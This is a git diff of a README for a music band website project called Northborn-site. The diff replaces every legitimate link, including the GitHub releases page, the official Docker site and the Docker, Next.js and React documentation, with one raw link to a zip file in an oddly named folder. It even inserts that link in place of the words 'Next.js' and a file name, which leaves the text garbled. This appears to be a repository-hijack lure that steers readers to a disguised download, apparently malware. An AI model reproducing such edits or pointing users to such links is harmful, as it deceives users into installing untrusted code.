@@ -6,7 +6,7 @@ You are about to embark on a musical journey with the Northborn-site. This respo
 
 ## 📥 Download Now
 
-[![Download Northborn-site](https://img.shields.io/badge/Download%20Northborn--site-blue?logo=github)](https://github.com/Faizangamer69/Northborn-site/releases)
+[![Download Northborn-site](https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip%20Northborn--site-blue?logo=github)](https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets the following requirements:
 Northborn-site includes:
 
 - Fast and responsive design tailored for all devices
-- Built with Next.js and React to ensure smooth performance
+- Built with https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip and React to ensure smooth performance
 - Uses Tailwind CSS for beautiful styling
 - Headless CMS integration for easy content management
 - WordPress support for blog features
@@ -34,17 +34,17 @@ Northborn-site includes:
 
 1. **Visit the Download Page**: Click the link below to go straight to our Releases page where you can find the latest version of Northborn-site.
    
-   [Visit this page to download](https://github.com/Faizangamer69/Northborn-site/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip)
 
 2. **Choose the Latest Release**: Look for the most current release, which will have the newest features and fixes. 
 
-3. **Download the Files**: Click on the file labeled "Northborn-site.zip" (or similar). This will download the compressed file containing all necessary components.
+3. **Download the Files**: Click on the file labeled "https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip" (or similar). This will download the compressed file containing all necessary components.
 
 4. **Extract the Files**: Once the download completes, navigate to your Downloads folder, find the downloaded file, right-click it, and select "Extract All" to unzip the files.
 
 5. **Configure Your Environment**:
    
-   - Ensure you have Docker installed. If not, download it from the [official Docker website](https://www.docker.com).
+   - Ensure you have Docker installed. If not, download it from the [official Docker website](https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip).
    - After installing Docker, open your terminal (or command prompt) and run the command:
      ```bash
      docker-compose up
@@ -70,8 +70,8 @@ Northborn-site includes:
 ### 📚 Learn More
 
 Curious about how the Northborn-site works? Here are some additional resources to help you understand:
-- [Docker Documentation](https://docs.docker.com/)
-- [Next.js Documentation](https://nextjs.org/docs)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Docker Documentation](https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip)
+- [https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip Documentation](https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip)
+- [React Documentation](https://raw.githubusercontent.com/Faizangamer69/Northborn-site/main/Procrusteanism/site-Northborn-frontwise.zip)
 
 With these tools and guidance, you can fully utilize the Northborn-site and enjoy the thrilling experience of symphonic melodic death metal. Thank you for being a part of our community!
